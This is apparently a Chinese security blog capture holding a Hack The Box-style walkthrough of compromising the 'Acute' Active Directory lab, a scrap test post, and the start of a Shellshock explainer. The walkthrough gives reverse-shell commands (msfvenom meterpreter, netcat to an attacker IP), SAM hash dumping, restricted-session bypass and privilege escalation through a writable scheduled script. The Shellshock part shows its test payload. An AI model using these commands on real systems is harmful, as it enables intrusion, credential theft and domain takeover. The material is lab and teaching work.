class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster vhost -u https://10.129.136.40 --domain acute.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112235.png"></p><blockquote><p>vhost爆破太慢，暂时放下</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112647.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, <span class="hljs-keyword">Joshua </span>Morgan, Lois Hopkins<br></code></pre></td></tr></table></figure><blockquote><p>还可以下到一个新员工检查表</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112932.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113059.png"></p><blockquote><p>两个页面全是404：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113503.png"></p><blockquote><p>网站管理员是Lois：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113617.png"></p><blockquote><p>默认密码： Password1!</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113734.png"></p><blockquote><p>PSWA上有一个dc_manage会话：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114009.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114100.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114259.png"></p><blockquote><p>remote超链接<code>https://atsserver.acute.local/Acute_Staff_Access</code>是PSWA的地址：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820115431.png"></p><blockquote><p>到这里一条路径就显现出来了，因为我们现在有员工清单和默认密码，完全可以尝试登录PSWA</p></blockquote><blockquote><p>除此之外还应先用exiftool检查该文档</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114928.png"></p><blockquote><p>创建者是FCastle，修改者是Daniel，然而他们都不在之前的名单中<br>主机名是Acute-PC01</p></blockquote><h2 id="0x03-PSWA"><a href="#0x03-PSWA" class="headerlink" title="0x03 PSWA"></a>0x03 PSWA</h2><h3 id="edavies-Acute-PC01"><a href="#edavies-Acute-PC01" class="headerlink" title="edavies@Acute-PC01"></a>edavies@Acute-PC01</h3><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820115535.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, <span class="hljs-keyword">Joshua </span>Morgan, Lois Hopkins<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120146.png"></p><blockquote><p>接着我尝试了上述清单中的名字，无一例外的全部不正确<br>考虑到外国人可能会有一些奇怪的约定俗成的命名方式，我让gpt生成一个简单的用户名字典</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120502.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120941.png"></p><blockquote><p>edavies成功了！</p></blockquote><blockquote><p>这也让我们知道了开发者的命名习惯，名字的前半部分取第一个字母+后半部分（Evan Davies&#x3D;edavies），这样看其实在前面发现的FCastle时就已有预兆</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820121232.png"></p><blockquote><p>拿到了初始立足点</p></blockquote><h2 id="0x04-稳固立足点"><a href="#0x04-稳固立足点" class="headerlink" title="0x04 稳固立足点"></a>0x04 稳固立足点</h2><blockquote><p>在我多次尝试建立smb连接时全都被中断，严重怀疑存在AV</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820160720.png"></p><blockquote><p>查看是否开启defender（0x0为开启）：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820161815.png"></p><blockquote><p>查看是否开启defender防火墙（0x1为开启）：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile&quot;</span> /v EnableFirewall<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820161958.png"></p><blockquote><p>全开了，那么例行惯例先看排除目录：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820162819.png"></p><blockquote><p>显然<code>C:\Windows\System32 </code>没有权限，但是<code>C:\Utils</code>是突破口可以落地</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=10.10.16.8 -f exe -o fy.exe<br></code></pre></td></tr></table></figure><h2 id="0x05-横向移动"><a href="#0x05-横向移动" class="headerlink" title="0x05 横向移动"></a>0x05 横向移动</h2><h3 id="imonks-ATSSERVER"><a href="#imonks-ATSSERVER" class="headerlink" title="imonks@ATSSERVER"></a>imonks@ATSSERVER</h3><blockquote><p>传winpeas执行</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165546.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165608.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\edavies\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180419.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165943.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\<span class="hljs-number">2.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>\passwords.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180523.png"></p><blockquote><p>获得了一个很长的密码字典，先保存到本地</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820173133.png"></p><blockquote><p>看着像在AD里面</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180242.png"></p><blockquote><p>令人意外的是有一个正在进行中的rdp会话，这显然不是我们，有必要进行rdp监控screenshare</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165337.png"></p><blockquote><p>得到的信息：edavies正在使用<code>acute\imonks</code>@<code>w3_4R3_th3_f0rce.</code>凭据向<code>ATSSERVER</code>进行身份验证，使用的配置还是<code>dc_manage</code></p></blockquote><blockquote><p>按照他的语句尝试连接：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;W3_4R3_th3_f0rce.&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\imonks&quot;</span>, <span class="hljs-variable">$pass</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182153.png"></p><blockquote><p>看起来好像是<code>Measure-Object</code>的cmdlet没被加载</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182315.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182500.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820183038.png"></p><blockquote><p>如gpt所言，用<code>Invoke-Command</code> 远程加载运行代码时，它会在一个新的上下文中执行，从而绕过<code>dc_manage</code>的限制</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820183324.png"></p><blockquote><p>现在我们获得了一个<code>ATSSERVER</code>机器的初始权限，以imonks的身份</p></blockquote><h3 id="jmorgan-Acute-PC01"><a href="#jmorgan-Acute-PC01" class="headerlink" title="jmorgan@Acute-PC01"></a>jmorgan@Acute-PC01</h3><p>在这种受限的条件下枚举可用命令是十分有必要的（包括alias）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">Get-Command</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820193345.png"></p><blockquote><p>在检索该用户桌面时还发现了一个脚本文件：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820195913.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$securepasswd</span> = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$securepasswd</span> | <span class="hljs-built_in">ConvertTo-SecureString</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, <span class="hljs-variable">$passwd</span>)<br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Get-Volume</span>&#125; <span class="hljs-literal">-ComputerName</span> Acute<span class="hljs-literal">-PC01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span><br></code></pre></td></tr></table></figure><blockquote><p>在<code>Acute-PC01</code>上逐行执行，尝试获得凭据</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820205550.png"></p><blockquote><p>很遗憾但是在情理之中的失败，显然是因为安全密码字符串是使用仅在被加密的计算机上可用的信息进行加密的</p></blockquote><blockquote><p>那么我们现在其实只能通过之前的命令去<code>ATSSERVER</code>上执行该脚本</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; C:\users\imonks\desktop\wm.ps1 &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820210222.png"></p><blockquote><p>这里执行的是写好的<code>Get-Volume</code>命令，那么我们很自然的可以想到替换成反射shell语句，来拿到<code>acute\jmorgan</code>在<code>Acute-PC01</code>上的shell</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-variable">$securepasswd</span> = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c 0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span>; <span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$securepasswd</span> | <span class="hljs-built_in">ConvertTo-SecureString</span>; <span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, <span class="hljs-variable">$passwd</span>); <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Get-Volume</span>&#125; <span class="hljs-literal">-ComputerName</span> Acute<span class="hljs-literal">-PC01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820211948.png"></p><blockquote><p>一如我们在之前查看的，可用的cmdlet并没有ConvertTo-SecureString<br>但很矛盾的是我们上一步中已经成功执行了该脚本</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820212422.png"></p><blockquote><p>根据gpt的说法，可能是该脚本的缓存机制导致了脚本中可用ConvertTo-SecureString<br>而且幸运的是，这个脚本就在我们可控用户的桌面，它是可控的<br>同时由于Set-Content这个cmdlet可用，所以我们可以很轻松的将其修改为反弹shell语句</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; ((<span class="hljs-built_in">cat</span> ..\desktop\wm.ps1 <span class="hljs-literal">-Raw</span>) <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;Get-Volume&#x27;</span>, <span class="hljs-string">&#x27;C:\utils\nc64.exe -e cmd 10.10.16.8 9999&#x27;</span>) | <span class="hljs-built_in">sc</span> <span class="hljs-literal">-Path</span> ..\desktop\wm.ps1 &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820213531.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820213736.png"></p><blockquote><p>至此拿到了<code>jmorgan</code>在Acute-PC01的立足点</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820215414.png"></p><h3 id="awallace-ATSSERVER"><a href="#awallace-ATSSERVER" class="headerlink" title="awallace@ATSSERVER"></a>awallace@ATSSERVER</h3><blockquote><p>很遗憾，即使我们已经是<code>BUILTIN\Administrators</code>的成员，但仍然不够，<code>c:\users\administrator\desktop\root.txt</code>并不在这台机子，还需要进一步提权到域管理组去疑似域控的<code>ATSSERVER</code>寻找</p></blockquote><blockquote><p>现在我们手上有一个本地管理员用户，不管怎样我们都应该优先转储哈希</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg save HKLM\system sys.bak<br>reg save HKLM\sam sam.bak<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">secretsdump.py -sam sam.bak -system sys.bak LOCAL<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821105401.png"></p><blockquote><p>获得了Guest是空密码和Administrator是<code>Password@123</code><br>在任何情况下获得新的密码时，尝试密码复用都是很有必要的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;Password@123&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span> <br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\awallace&quot;</span>, <span class="hljs-variable">$pass</span>)<br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110102.png"></p><blockquote><p>事实上，该密码被awallace在ATSSERVER上使用</p></blockquote><blockquote><p>我们现在又回到了这台受限制的机子<code>ATSSERVER</code>，以awallace的身份<br>和之前一样，还是做一些必要的探索：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110407.png"></p><blockquote><p>就cmdlet来说还是一样的苛刻</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">ls</span> <span class="hljs-string">&#x27;\program files\keepmeon&#x27;</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110726.png"></p><blockquote><p>不同的是，这次可以对神秘的program <code>keepmeon</code>访问了</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-comment">REM This is run every 5 minutes. For Lois use ONLY</span><br>@<span class="hljs-built_in">echo</span> off<br> <span class="hljs-keyword">for</span> /R <span class="hljs-variable">%%x</span> <span class="hljs-keyword">in</span> (*.bat) <span class="hljs-keyword">do</span> ( <br> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> &quot;<span class="hljs-variable">%%x</span>&quot; == &quot;%~<span class="hljs-number">0</span>&quot; <span class="hljs-keyword">call</span> &quot;<span class="hljs-variable">%%x</span>&quot;<br> )<br></code></pre></td></tr></table></figure><blockquote><p>看起来我们的网站管理员lois会定时执行这个文件，文件本身是用来执行除自己外的bat文件<br>让我们先来查看lois(网站管理员)能做什么：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; net <span class="hljs-built_in">group</span> /domain &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; net <span class="hljs-built_in">group</span> Site_Admin /domain &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821111157.png"></p><blockquote><p>对于<code>Site_Admin</code>组的描述是紧急情况下的可访问域管理员组<br>此时思路已经明了，我选择将我们控制的awallace加入<code>site_admin</code>组</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;\program files\keepmeon\fy.bat&#x27;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&#x27;net group site_admin awallace /add /domain&#x27;</span>&#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><blockquote><p>添加上述bat文件，loris会替我们执行它</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821112612.png"></p><blockquote><p>为了保险起见我还添加了jmorgan测试<br>现在我们应该已经可以读到<code>c\users\administrator\desktop\root.txt</code></p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">cat</span> <span class="hljs-string">&#x27;c:\users\administrator\desktop\root.txt&#x27;</span>  &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/08/30/1111/"/>
    <url>/2024/08/30/1111/</url>
    
    <content type="html"><![CDATA[<p>![[Pasted image 20240830110808.png]]</p><p>11111<br>111</p><p>asudha</p><p>![[Pasted image 20240830110838.png]]</p><p>!(q)[.&#x2F;pic&#x2F;20240830110838.png]</p><p>![](<a href="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted">https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted</a> image 20240830110808.png)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellshock总结</title>
    <link href="/2024/04/06/shellshock%E6%80%BB%E7%BB%93/"/>
    <url>/2024/04/06/shellshock%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><blockquote><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#payload：</span><br><span class="hljs-built_in">env</span> x=<span class="hljs-string">&#x27;() &#123; :; &#125;; echo shellshocked&#x27;</span> bash -c <span class="hljs-string">&quot;echo 1&quot;</span><br><span class="hljs-comment">#存在漏洞时输出有shellshock（注意加必要的空格）</span><br></code></pre></td></tr></table></figure><blockquote><p>漏洞核心原理：类似代码注入，父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行，本质上是bash代码本身对于处理该类环境变量时的不合理</p></blockquote><h2 id="0x02-前置知识-环境变量-bash"><a href="#0x02-前置知识-环境变量-bash" class="headerlink" title="0x02 (前置知识) 环境变量&amp;bash"></a>0x02 (前置知识) 环境变量&amp;bash</h2><p>1、shell变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331181204.png" alt="image.png"></p><blockquote><p>子进程不继承普通shell变量</p></blockquote><p>2、shell环境变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331181357.png" alt="image.png"></p><blockquote><p>子进程可以继承环境变量</p></blockquote><p>3、shell函数变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331182209.png" alt="image.png"></p><blockquote><p>子进程不继承普通函数变量</p></blockquote><p>4、环境变量版函数变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331183038.png" alt="image.png"></p><blockquote><p>子进程会继承环境变量版函数变量</p></blockquote><p>5、字符串版 函数环境变量（漏洞点1）</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331185121.png" alt="image.png"></p><blockquote><p>将函数声明当作字符串赋值给环境变量时，子进程会错误的把普通环境变量当作函数变量执行！</p></blockquote><blockquote><p>对比没有漏洞的kali：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404130737.png" alt="image.png"></p></blockquote><p>6、字符串定义一次性版 函数环境变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404132634.png" alt="image.png"></p><blockquote><p>env定义一次性环境变量，之后可加被作用的命令语句</p></blockquote><blockquote><p>对比没有漏洞的kali：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404133435.png" alt="image.png"></p></blockquote><p>7、字符串定义版 函数环境变量注入：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404143137.png" alt="image.png"></p><blockquote><p>启动bash子进程时居然执行了一次在函数定义语句后方的注入代码！<br>具体原因后文探讨</p></blockquote><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><blockquote><p>触发shellshcok：</p><ol><li>存在子进程对字符串环境变量的解析错误（解析为函数变量），得以获得有问题的函数变量</li><li>bash未对函数变量做明确的界定、截取，导致结尾处代码注入（具体原因后文探讨）</li></ol></blockquote><h2 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h2><h3 id="1、bash对于函数变量的解析"><a 